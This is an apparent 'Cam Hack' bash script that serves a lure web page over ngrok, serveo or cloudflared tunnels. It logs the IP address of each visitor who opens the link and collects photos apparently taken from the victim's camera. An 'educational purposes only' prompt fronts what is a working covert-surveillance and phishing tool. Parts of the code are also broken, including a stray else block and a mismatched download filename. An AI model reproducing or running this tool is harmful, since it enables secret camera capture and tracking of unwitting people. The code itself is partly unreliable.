#!/bin/bash
clear
printf "\n"
printf "\n"
printf "\n"
echo ''
echo -e "\e[95m 
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
     ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
     ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
     ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
     ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  \e[95;1m \e[0m\n"
  echo""    
  echo -e $'\e[1;33m\e[0m\e[1;33m    ██████████\e[0m'"\e[96m██████████"'\e[1;33m\e[0m\e[1;31m██████████\e[0m' '\e[1;32m\e[0m\e[1;32m Cam Hack \e[0m''\e[1;37m\e[0m\e[1;37m [v 2.0] \e[0m'                                       
  echo ""
      echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+ +-+-+-+-+-+-+-+ >>\e[0m'
      echo -e "\e[93m    |O|n|l|i|n|e| |H|a|c|k|i|n|g|"      
      echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+ +-+-+-+-+-+-+-+ >>\e[0m' 
      echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+ >>\e[0m'
      echo -e "\e[95m    |S|U|M|A|N|"      
      echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+ >>\e[0m' 
      echo ""  
sleep 7
clear
echo "   NGROK PLEASE TURN ON YOUR HOTSPOT OTHERWISE YOU DONT GET LINK...!"
sleep 3
clear
read -p $'EDUCATIONAl PURPOSES ONLY ? \e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m (Y/N) : \e[0m' option
echo ""
clear

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi
if [[ $option == *'No'* ]]; then
clear
exit
fi
if [[ $option == *'nO'* ]]; then
clear
exit
fi
if [[ $option == *'no'* ]]; then
clear
exit
fi
if [[ $option == *'NO'* ]]; then
clear
exit
fi

trap 'printf "\n";stop' 2

banner() {

printf "\e[1;92m   SUMAN   Online Hacking   \e[0m\n"
printf " \e[36m \n"
printf "     ██████  ███████ ███    ███        \n"
printf "     ██      ██   ██ ████  ████        \n"
printf "     ██      ███████ ██ ████ ██        \n"
printf "     ██      ██   ██ ██  ██  ██        \n"
printf "     ██████  ██   ██ ██      ██        \n"
printf "                                   \e[0m    \n"
printf "   \e[95m                                     \n"
printf "          ██   ██  █████   ██████ ██   ██   \n"
printf "          ██   ██ ██   ██ ██      ██  ██    \n"
printf "          ███████ ███████ ██      █████     \n"
printf "          ██   ██ ██   ██ ██      ██  ██    \n"
printf "          ██   ██ ██   ██  ██████ ██   ██   \n"
printf "                                     \e[0m  \n"
printf "       \n"                    
printf "\n"

}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting Targets Open Link...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target Opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
echo ""
echo '
     ---------------------------   
    !    PHOTOS FILE RECEIVED   ! 
     ---------------------------   ' | lolcat
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

echo ""
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------   \e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !      STARTING SERVEO      !  \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------   \e[0m'

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
echo ""
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !   PHP SERVER NOW STARTING   !  \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' Friend-day.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
echo '
      ---------------------------------   
    !!         DOWNLOADING NGROK       !!  
      ---------------------------------   ' | lolcat
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !  PHP Server Now Starting  !  \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo ""
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !    Manually Start Ngrok   !  \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo ""
echo ""
echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m ./ngrok http 3333  "
echo ""
echo ""
echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click ENTER to Continue \e[1;91m (enter) : \e[0m' option
echo""


sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Link Chack Your New Tab Open Ngrok \e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflare (PRO)\e[0m\n"
default_option_server="1"
read -p $' \e[0m'
wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared-linux-arm64
chmod +x cloudflared-linux-arm64
echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Cloudflared...\e[0m  "
			   echo -ne "  "
   		           if [[ `command -v termux-chroot` ]]; then
			  sleep 2 && termux-chroot ./cloudflared-linux-arm64 tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
   			  else
     		           sleep 2 && ./cloudflared-linux-arm64 tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
   	                 fi
			{ sleep 8; clear; }
				clink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
			   
			   echo ""

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {

echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
printf "\e[1;33m\e[0m\e[1;33m Cloudflared Link :\e[0m\e[1;77m %s\e[0m\n" $clink                                   
echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'

sed 's+forwarding_link+'$send_link'+g' Friend-day.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}

start() {


server
payload
checkfound

}

banner
dependencies
start1
